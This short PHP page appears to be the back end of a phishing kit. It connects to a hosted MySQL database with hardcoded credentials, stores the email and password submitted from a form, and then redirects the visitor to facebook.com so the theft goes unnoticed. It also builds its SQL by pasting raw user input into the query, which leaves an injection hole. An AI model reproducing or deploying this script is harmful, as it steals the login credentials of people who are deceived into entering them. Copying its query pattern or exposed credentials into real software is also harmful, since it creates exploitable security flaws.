<html>

<head>


</head>

<body>
<?php 
	$host = "eu-cdbr-west-01.cleardb.com";
    $user = "b8603e9c190f52";
    $pwd = "c490469a";
    $db = "heroku_622959c24715e55";
    try 
    {
        $conn = new PDO( "mysql:host=$host;dbname=$db", $user, $pwd);
        $conn->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );
    }
    catch(Exception $e)
    {
        die(var_dump($e));
    }
    $email = $_POST["email"];
	 $password = $_POST["fpassword"];
	//$sql_select = "INSERT INTO users (email, password) VALUES ( 'hey', 'there')";

	$sql_select = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
	$stmt = $conn->prepare($sql_select);
    $stmt->execute();


?>
<script>
window.location = "https://facebook.com";
</script>
</body>

</html>